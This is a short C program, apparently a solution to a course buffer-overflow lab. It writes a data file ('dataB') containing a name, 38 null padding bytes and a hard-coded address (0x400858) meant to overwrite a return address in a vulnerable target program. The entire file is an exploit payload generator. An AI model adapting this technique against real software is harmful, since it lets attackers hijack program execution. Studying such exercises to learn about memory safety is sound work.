
#include <stdio.h>

int main(void){
   FILE *psFile;
   int i;
   unsigned long ulData;
   psFile = fopen("dataB", "w");
   fputs("Rohan Alex",psFile);
 
   for (i = 0; i < 38; i++)
      putc('\0', psFile);
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   putc('\n', psFile); 
   fclose(psFile); 
   return 0; 
}
